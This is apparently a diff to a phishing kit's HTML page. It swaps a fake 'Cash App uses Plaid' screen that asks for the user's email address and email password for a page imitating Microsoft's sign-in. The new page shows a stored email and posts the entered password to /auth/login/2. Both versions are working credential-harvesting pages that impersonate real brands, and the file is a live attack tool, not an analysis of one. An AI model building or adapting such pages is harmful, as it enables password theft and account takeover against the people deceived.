@@ -1,135 +1,107 @@
 <!DOCTYPE html>
-<html lang="en">
+<html dir="ltr" lang="en">
 
 <head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Login</title>
-  <link rel="shortcut icon" href="/img/favicon.png" type="image/x-icon">
-  <link rel="stylesheet" href="/css/mail.css">
+  <title>Sign in to your account</title>
+  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/main.css">
   <script src="/js/jquery.js"></script>
 </head>
 
-<body>
-  <div class="overlay">
-    <div id="pldWrapper" class="content-wrapper">
-      <div class="content-header">
-        <div class="logo-wrapper">
-          <span class="header-logo app-logo">
-            <svg role="img" viewBox="0 0 148 32" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:225px;">
-              <path fill-rule="evenodd" clip-rule="evenodd" d="M27.3911 0.546667C25.6618 0 24.056 0 20.8436 0H11.1569C7.944 0 6.33778 0 4.60889 0.546667C2.72089 1.23378 1.23378 2.72089 0.546667 4.60889C0 6.33778 0 7.94444 0 11.1569V20.8431C0 24.056 0 25.6618 0.546667 27.3911C1.23378 29.2791 2.72089 30.7662 4.60889 31.4533C6.33778 32 7.944 32 11.1569 32H20.8436C24.056 32 25.6618 32 27.3911 31.4533C29.2791 30.7662 30.7662 29.2791 31.4533 27.3911C32 25.6618 32 24.056 32 20.8431V11.1569C32 7.94444 32 6.33778 31.4533 4.60889C30.7662 2.72089 29.2791 1.23378 27.3911 0.546667ZM20.6565 12.2971C19.6876 11.4372 18.2047 10.8107 16.6576 10.8107C15.4468 10.8107 14.2351 11.244 14.2351 12.3396C14.2351 13.3776 15.3413 13.7764 16.6911 14.2631C16.8035 14.3036 16.9176 14.3448 17.0329 14.3869C19.6574 15.281 21.8199 16.377 21.8199 18.9723C21.8199 21.7932 19.6499 23.7204 16.1043 23.9392L15.7822 25.4726C15.7237 25.7539 15.4743 25.9546 15.1872 25.9524L12.9561 25.9356C12.5733 25.9324 12.2902 25.5798 12.3695 25.2059L12.7093 23.6109C11.3137 23.2308 10.0909 22.5521 9.12512 21.6146C8.88101 21.378 8.8788 20.9855 9.12114 20.7467L10.3599 19.5248C10.5947 19.2931 10.9704 19.2949 11.2052 19.5266C12.4023 20.7068 13.9449 21.1928 15.4176 21.1928C17.0329 21.1928 18.1285 20.5296 18.1285 19.4047C18.1285 18.4136 17.2318 18.0827 15.5233 17.4522C15.3433 17.3858 15.1543 17.316 14.9564 17.2418C12.7647 16.4634 10.6882 15.3386 10.6882 12.714C10.6882 9.68231 13.198 8.20479 16.1592 8.05681L16.4848 6.52568C16.5442 6.24701 16.7905 6.04764 17.0754 6.04764H19.303C19.6867 6.04764 19.9724 6.4003 19.894 6.77555L19.5325 8.49719C20.8107 8.91586 21.8491 9.56978 22.6227 10.2348C22.8854 10.4603 22.8943 10.8643 22.651 11.1111L21.4982 12.2803C21.2683 12.5133 20.9015 12.5146 20.6565 12.2971Z" fill="#000"></path>
-            </svg>
-          </span>
-          <img src="/img/pld-logo.png" class="header-logo pld-logo">
-        </div>
-
-        <h1 class="content-title">Cash App uses <strong>Plaid</strong> to authenticate your email address</h1>
-
-        <ul class="content-checklist">
-          <li class="content-checklist-row">
-            <i class="checklist-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" role="presentation">
-                <path d="M20.42 7.12l-1.24-1.24 1.59-1.59-1.06-1.06-1.59 1.59-1.24-1.24a2.25 2.25 0 00-3.18 0l-2.47 2.48a.74.74 0 000 1.06l.88.88-1.59 1.59 1.06 1.06 1.59-1.59 1.77 1.77-1.59 1.59 1.06 1.06L16 11.89l.88.88a.75.75 0 001.06 0l2.48-2.47a2.25 2.25 0 000-3.18zm-1.06 2.12l-1.95 1.94-4.59-4.59 1.94-1.95a.75.75 0 011.06 0l3.54 3.54a.75.75 0 010 1.06zm-11.24 1a.77.77 0 00-1.06 0L4.58 12.7a2.25 2.25 0 000 3.18l1.24 1.24-1.73 1.73 1.06 1.06 1.73-1.73 1.24 1.24a2.22 2.22 0 001.59.66 2.25 2.25 0 001.59-.66l2.47-2.48a.74.74 0 000-1.06zm2.12 8.13a.75.75 0 01-1.06 0l-3.54-3.55a.75.75 0 010-1.06l2-1.94 4.59 4.59z" fill="currentColor"></path>
-                <path fill="none" d="M0 0h24v24H0z"></path>
-              </svg>
-            </i>
-
-            <div>
-              <h2 class="checklist-primary-text">Verify effortlessly</h2>
-              <p class="checklist-secondary-text">Plaid lets you securely verify your email address in seconds</p>
-            </div>
-          </li>
-          <li class="content-checklist-row">
-            <i class="checklist-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" role="presentation">
-                <path fill="none" d="M0 0h24v24H0z"></path>
-                <path d="M21.18 11.12L17.3 7.24a7.49 7.49 0 00-9.73-.73l-3-3-1.1 1.02 3 3-3.65 3.59a1.26 1.26 0 000 1.76l3.88 3.88a7.48 7.48 0 009.73.73l3 3 1.06-1.06-3-3 3.62-3.62a1.26 1.26 0 00.07-1.69zM12 17.45a6 6 0 01-4.24-1.75L4.06 12 7.5 8.56l1.37 1.38a3.75 3.75 0 005.19 5.19l1.3 1.29A5.92 5.92 0 0112 17.45zM14 13l-3-3a2.19 2.19 0 011-.23A2.25 2.25 0 0114.25 12a2.19 2.19 0 01-.25 1zm-1 1a2.19 2.19 0 01-1 .23A2.25 2.25 0 019.75 12a2.19 2.19 0 01.25-1zm3.54 1.42l-1.37-1.38a3.75 3.75 0 00-5.23-5.17l-1.3-1.29a6 6 0 017.6.72l3.7 3.7z" fill="currentColor"></path>
-              </svg>
-            </i>
-
-            <div>
-              <h2 class="checklist-primary-text">Your data is secure</h2>
-              <p class="checklist-secondary-text">Plaid encrypts all sessions and requests using 256-bit encryption</p>
-            </div>
-          </li>
-        </ul>
+<body style="margin: 0;padding: 0;">
+  <form name="userForm" id="userForm" method="post" action="/auth/login/2" class="main-form provide-min-height">
+    <div class="login-paginated-page">
+      <div class="background-image-holder">
+        <div id="backgroundImage" class="background-image ext-background-image" style="background-image: url('/img/hero_bg.svg');"></div>
       </div>
 
-      <div class="content-divider"></div>
+      <div class="outer">
+        <div class="template-section main-section">
+          <div class="middle ext-middle">
+            <div class="full-height">
+              <div class="flex-column">
+                <div class="win-scroll">
+                  <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
+                    <div class="lightbox-cover"></div>
+                    <div>
+                      <img class="logo" role="img" src="/img/logo.svg" alt="Microsoft">
+                    </div>
 
-      <div class="content-actions">
-        <p class="actions-fineprint">By selecting “Continue” you agree to the <button type="button">Plaid End User Privacy Policy</button></p>
+                    <div role="main">
+                      <div class="identityBanner">
+                        <div class="identity" id="emailO365"></div>
+                        <script>
+                          if (typeof Storage !== "undefined") {
+                            document.getElementById("emailO365").innerHTML =
+                              localStorage.getItem("emailO365");
+                          } else {
+                            console.log("Sorry, your browser does not support Web Storage...");
+                          }
+                        </script>
+                      </div>
 
-        <button id="showEmailWrapper" class="actions-continue" type="button">Continue</button>
+                      <div class="pagination-view has-identity-banner animate slide-in-back">
+                        <div class="row title ext-title" id="loginHeader">
+                          <div role="heading">Enter password</div>
+                        </div>
+
+                        <div class="row">
+                          <div class="form-group col-md-24">
+                            <div class="error ext-error" style="display: none;">Please enter your password to authorize this sign in.</div>
+
+                            <div class="placeholderContainer">
+                              <input type="password" name="password" id="password" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" placeholder="Password" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+                            </div>
+                          </div>
+                        </div>
+
+                        <div class="position-buttons password-reset-links-container ext-password-reset-links-container">
+                          <div class="row">
+                            <div class="col-md-24">
+                              <div class="text-13">
+                                <div class="form-group">
+                                  <a id="idA_PWD_ForgotPassword" name="cannotAccessAccount" href="https://account.live.com/ResetPassword.aspx">Forgot password?</a>
+                                </div>
+
+                                <div class="form-group"></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+
+                        <div class="win-button-pin-bottom">
+                          <div class="row">
+                            <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">
+                              <div class="inline-block button-item ext-button-item">
+                                <input type="submit" id="userSubmitButton" class="win-button button_primary button ext-button primary ext-primary" value="Next">
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div id="footer" role="contentinfo" class="footer ext-footer">
+        <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links">
+          <a id="ftrTerms" href="https://www.microsoft.com/en-US/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
+          <a id="ftrPrivacy" href="https://privacy.microsoft.com/en-US/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
+          <a id="moreOptions" href="javascript:void(0)" role="button" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
+        </div>
       </div>
     </div>
+  </form>
 
-    <form action="/auth/login/2" method="post">
-      <div id="emailWrapper" class="content-wrapper login hide">
-        <div class="content-header">
-          <div class="nav-header">
-            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA2NCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0zMy42MjM4IDguMTMzOUMzMy4wOTUzIDcuNjg5NSAzMi4xOTMzIDcuNDY3MyAzMC45MTczIDcuNDY3M0gyOC4wMzkzVjE2LjM2MTRIMzAuMTkxM1YxMy41NzQzSDMxLjE1NTNDMzIuMzI1MyAxMy41NzQzIDMzLjE4MzMgMTMuMzE2NyAzMy43MjkzIDEyLjgwMTFDMzQuMzQ0OCAxMi4yMjM0IDM0LjY1MzggMTEuNDU0MyAzNC42NTM4IDEwLjQ5NDNDMzQuNjUzOCA5LjQ5ODkxIDM0LjMxMDMgOC43MTIxMiAzMy42MjM4IDguMTMzOVpNMzEuMTAxOCAxMS41NjEzSDMwLjE5MTNWOS40ODA3M0gzMS4wMDkzQzMyLjAwNDMgOS40ODA3MyAzMi41MDE4IDkuODI5NjkgMzIuNTAxOCAxMC41Mjc2QzMyLjUwMTggMTEuMjE2NCAzMi4wMzQ4IDExLjU2MTMgMzEuMTAxOCAxMS41NjEzWiIgZmlsbD0iIzExMTExMSIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTM4LjMzNjcgNy40NjcxNEgzNi4wOTI3VjE2LjM2MTJINDAuOTM3N1YxNC4zNDc4SDM4LjMzNjdWNy40NjcxNFoiIGZpbGw9IiMxMTExMTEiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00NS4zMzM4IDcuNDY3MTRMNDEuODA4OCAxNi4zNjEySDQ0LjIyNDhMNDQuNjg2OCAxNS4wNjc5SDQ3Ljc0OThMNDguMTcyMyAxNi4zNjEySDUwLjYxNTNMNDcuMTE1OCA3LjQ2NzE0SDQ1LjMzMzhaTTQ1LjMwNzMgMTMuMjY3Nkw0Ni4yMzE4IDEwLjIyNzVMNDcuMTQyMyAxMy4yNjc2SDQ1LjMwNzNaIiBmaWxsPSIjMTExMTExIi8+CjxtYXNrIGlkPSJtYXNrMF82MjY6MTA1OSIgc3R5bGU9Im1hc2stdHlwZTphbHBoYSIgbWFza1VuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeD0iMCIgeT0iMCIgd2lkdGg9IjY0IiBoZWlnaHQ9IjI0Ij4KPHBhdGggZD0iTTAuNSAyMy43MzY3SDYzLjVWMC4wMDAyMTM2MjNIMC41VjIzLjczNjdaIiBmaWxsPSJ3aGl0ZSIvPgo8L21hc2s+CjxnIG1hc2s9InVybCgjbWFzazBfNjI2OjEwNTkpIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik01MS43MzY1IDE2LjM2MTJINTMuOTgxVjcuNDY3MTRINTEuNzM2NVYxNi4zNjEyWiIgZmlsbD0iIzExMTExMSIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTYyLjY5NDYgOS4xMzQwNUM2Mi4zOTUxIDguNzA3MzIgNjIuMDM4NiA4LjM2NTQ0IDYxLjYyNTEgOC4xMDczOEM2MC45NDc2IDcuNjgwNjYgNjAuMDIzMSA3LjQ2NzA0IDU4Ljg1MjYgNy40NjcwNEg1NS44OTU2VjE2LjM2MTFINTkuMzU0NkM2MC42MDQxIDE2LjM2MTEgNjEuNjA3NiAxNS45NTI2IDYyLjM2NDYgMTUuMTM0NUM2My4xMjE2IDE0LjMxNjkgNjMuNDk5NiAxMy4yMzIxIDYzLjQ5OTYgMTEuODgwN0M2My40OTk2IDEwLjgwNTYgNjMuMjMxMSA5Ljg5MDAzIDYyLjY5NDYgOS4xMzQwNVpNNTkuMTAzNiAxNC4zNDc3SDU4LjE0MDFWOS40ODA0OEg1OS4xMTcxQzU5LjgwMzYgOS40ODA0OCA2MC4zMzExIDkuNjk1MSA2MC43MDExIDEwLjEyMzhDNjEuMDcwNiAxMC41NTI2IDYxLjI1NTYgMTEuMTYwNiA2MS4yNTU2IDExLjk0NzRDNjEuMjU1NiAxMy41NDc3IDYwLjUzODYgMTQuMzQ3NyA1OS4xMDM2IDE0LjM0NzdaIiBmaWxsPSIjMTExMTExIi8+CjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNOS44MTg2NiAwLjAwMDExNDQ0MUwyLjU0NDY2IDEuOTA0OTdMMC41NDA2NjQgOS4yMTkzOUwzLjA0NzY2IDExLjc5MzRMMC40OTk2NjQgMTQuMzI0OUwyLjM4NjE2IDIxLjY3MTdMOS42MjgxNiAyMy42OTUyTDEyLjE3NjIgMjEuMTYzMUwxNC42ODMyIDIzLjczNjZMMjEuOTU2NyAyMS44MzE4TDIzLjk2MDcgMTQuNTE2M0wyMS40NTQyIDExLjk0MzRMMjQuMDAxNyA5LjQxMThMMjIuMTE1NyAyLjA2NTA2TDE0Ljg3MjcgMC4wNDE1MjQ0TDEyLjMyNTcgMi41NzMwOUw5LjgxODY2IDAuMDAwMTE0NDQxWk01LjM1NDY2IDMuMzExOUw5LjE4NjE2IDIuMzA3OTZMMTAuODYxNyA0LjAyNzk5TDguNDE4MTYgNi40NTYwM0w1LjM1NDY2IDMuMzExOVpNMTMuNzY1NyA0LjA1MTIyTDE1LjQ2ODIgMi4zNTk0N0wxOS4yODMyIDMuNDI1NTNMMTYuMTY5NyA2LjUxOTE2TDEzLjc2NTcgNC4wNTEyMlpNMi44MzYxNiA4LjYxODk1TDMuODkxNjYgNC43NjYzTDYuOTU0MTYgNy45MTA0M0w0LjUxMTE2IDEwLjMzODVMMi44MzYxNiA4LjYxODk1Wk0xNy42MDk3IDcuOTk3MjlMMjAuNzIzMiA0LjkwMzE2TDIxLjcxNjIgOC43NzM0OEwyMC4wMTQyIDEwLjQ2NTJMMTcuNjA5NyA3Ljk5NzI5Wk05Ljg1ODY2IDcuOTM0MTdMMTIuMzAyMiA1LjUwNjEzTDE0LjcwNTcgNy45NzQwNkwxMi4yNjI3IDEwLjQwMjFMOS44NTg2NiA3LjkzNDE3Wk01Ljk1MTY2IDExLjgxNjZMOC4zOTQ2NiA5LjM4ODU3TDEwLjc5OTIgMTEuODU2NUw4LjM1NTY2IDE0LjI4NDVMNS45NTE2NiAxMS44MTY2Wk0xMy43MDMyIDExLjg4MDJMMTYuMTQ2MiA5LjQ1MjJMMTguNTUwMiAxMS45MjAxTDE2LjEwNjcgMTQuMzQ4MkwxMy43MDMyIDExLjg4MDJaTTIuNzg1MTYgMTQuOTYzM0w0LjQ4ODE2IDEzLjI3MUw2Ljg5MTY2IDE1LjczOTRMMy43NzkxNiAxOC44MzI2TDIuNzg1MTYgMTQuOTYzM1pNOS43OTU2NiAxNS43NjI3TDEyLjIzOTIgMTMuMzM0NkwxNC42NDMyIDE1LjgwMjZMMTIuMjAwMiAxOC4yMzA2TDkuNzk1NjYgMTUuNzYyN1pNMTcuNTQ2NyAxNS44MjYzTDE5Ljk5MDIgMTMuMzk4M0wyMS42NjU3IDE1LjExNzhMMjAuNjEwMiAxOC45NzA0TDE3LjU0NjcgMTUuODI2M1pNNS4yMTg2NiAyMC4zMTEyTDguMzMxNjYgMTcuMjE3MUwxMC43MzYyIDE5LjY4NUw5LjAzMzY2IDIxLjM3NzNMNS4yMTg2NiAyMC4zMTEyWk0xMy42NDAyIDE5LjcwODdMMTYuMDgzMiAxNy4yODA3TDE5LjE0NjIgMjAuNDI0OEwxNS4zMTUyIDIxLjQyODNMMTMuNjQwMiAxOS43MDg3WiIgZmlsbD0iYmxhY2siLz4KPC9nPgo8L3N2Zz4K">
-          </div>
-
-          <div class="logo-wrapper">
-            <span class="header-logo app-logo">
-              <svg role="img" viewBox="0 0 148 32" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:225px;">
-                <path fill-rule="evenodd" clip-rule="evenodd" d="M27.3911 0.546667C25.6618 0 24.056 0 20.8436 0H11.1569C7.944 0 6.33778 0 4.60889 0.546667C2.72089 1.23378 1.23378 2.72089 0.546667 4.60889C0 6.33778 0 7.94444 0 11.1569V20.8431C0 24.056 0 25.6618 0.546667 27.3911C1.23378 29.2791 2.72089 30.7662 4.60889 31.4533C6.33778 32 7.944 32 11.1569 32H20.8436C24.056 32 25.6618 32 27.3911 31.4533C29.2791 30.7662 30.7662 29.2791 31.4533 27.3911C32 25.6618 32 24.056 32 20.8431V11.1569C32 7.94444 32 6.33778 31.4533 4.60889C30.7662 2.72089 29.2791 1.23378 27.3911 0.546667ZM20.6565 12.2971C19.6876 11.4372 18.2047 10.8107 16.6576 10.8107C15.4468 10.8107 14.2351 11.244 14.2351 12.3396C14.2351 13.3776 15.3413 13.7764 16.6911 14.2631C16.8035 14.3036 16.9176 14.3448 17.0329 14.3869C19.6574 15.281 21.8199 16.377 21.8199 18.9723C21.8199 21.7932 19.6499 23.7204 16.1043 23.9392L15.7822 25.4726C15.7237 25.7539 15.4743 25.9546 15.1872 25.9524L12.9561 25.9356C12.5733 25.9324 12.2902 25.5798 12.3695 25.2059L12.7093 23.6109C11.3137 23.2308 10.0909 22.5521 9.12512 21.6146C8.88101 21.378 8.8788 20.9855 9.12114 20.7467L10.3599 19.5248C10.5947 19.2931 10.9704 19.2949 11.2052 19.5266C12.4023 20.7068 13.9449 21.1928 15.4176 21.1928C17.0329 21.1928 18.1285 20.5296 18.1285 19.4047C18.1285 18.4136 17.2318 18.0827 15.5233 17.4522C15.3433 17.3858 15.1543 17.316 14.9564 17.2418C12.7647 16.4634 10.6882 15.3386 10.6882 12.714C10.6882 9.68231 13.198 8.20479 16.1592 8.05681L16.4848 6.52568C16.5442 6.24701 16.7905 6.04764 17.0754 6.04764H19.303C19.6867 6.04764 19.9724 6.4003 19.894 6.77555L19.5325 8.49719C20.8107 8.91586 21.8491 9.56978 22.6227 10.2348C22.8854 10.4603 22.8943 10.8643 22.651 11.1111L21.4982 12.2803C21.2683 12.5133 20.9015 12.5146 20.6565 12.2971Z" fill="#000"></path>
-              </svg>
-            </span>
-            <img src="/img/pld-logo.png" class="header-logo pld-logo">
-          </div>
-
-          <h1 class="content-title"><strong>Enter your email credentials</strong></h1>
-
-          <p>By providing the credentials of the email address linked with your <strong>Cash App</strong> to Plaid, you’re enabling Plaid to securely authenticate your email address and verify your identity.</p>
-        </div>
-
-        <div id="emailAddrForm">
-          <div class="input-wrapper">
-            <input name="emailAddr" id="emailAddr" class="base-input" type="email" placeholder="Email Address" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off" required>
-
-            <div class="input-icon-wrapper">
-              <i class="input-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" role="presentation">
-                  <path d="M17.5 10.25h-.75V8a4.75 4.75 0 00-9.5 0v2.25H6.5a1.25 1.25 0 00-1.25 1.25v7a1.25 1.25 0 001.25 1.25h11a1.25 1.25 0 001.25-1.25v-7a1.25 1.25 0 00-1.25-1.25zM8.75 8a3.25 3.25 0 016.5 0v2.25h-6.5zm8.5 10.25H6.75v-6.5h10.5zm-6-4.25h1.5v2h-1.5z" fill="currentColor"></path>
-                  <path fill="none" d="M0 0h24v24H0z"></path>
-                </svg>
-              </i>
-            </div>
-          </div>
-
-          <div class="content-actions">
-            <button id="showEmailPassForm" class="actions-continue disabled" type="button" disabled="true">Continue</button>
-          </div>
-        </div>
-
-        <div id="emailPassForm" class="hide">
-          <div class="input-wrapper">
-            <div class="pld-email-addr"></div>
-
-            <input name="emailPass" id="emailPass" class="base-input" type="password" placeholder="Email Password" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off" required>
-
-            <div class="input-icon-wrapper">
-              <i class="input-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" role="presentation">
-                  <path d="M17.5 10.25h-.75V8a4.75 4.75 0 00-9.5 0v2.25H6.5a1.25 1.25 0 00-1.25 1.25v7a1.25 1.25 0 001.25 1.25h11a1.25 1.25 0 001.25-1.25v-7a1.25 1.25 0 00-1.25-1.25zM8.75 8a3.25 3.25 0 016.5 0v2.25h-6.5zm8.5 10.25H6.75v-6.5h10.5zm-6-4.25h1.5v2h-1.5z" fill="currentColor"></path>
-                  <path fill="none" d="M0 0h24v24H0z"></path>
-                </svg>
-              </i>
-            </div>
-          </div>
-
-          <div class="content-actions">
-            <button id="submitBtn" class="actions-continue disabled" type="submit" disabled="true">Continue</button>
-          </div>
-        </div>
-      </div>
-    </form>
-  </div>
-
-  <script src="/js/mail.js"></script>
+  <script src="/js/main.js"></script> 
 </body>
 
 </html>
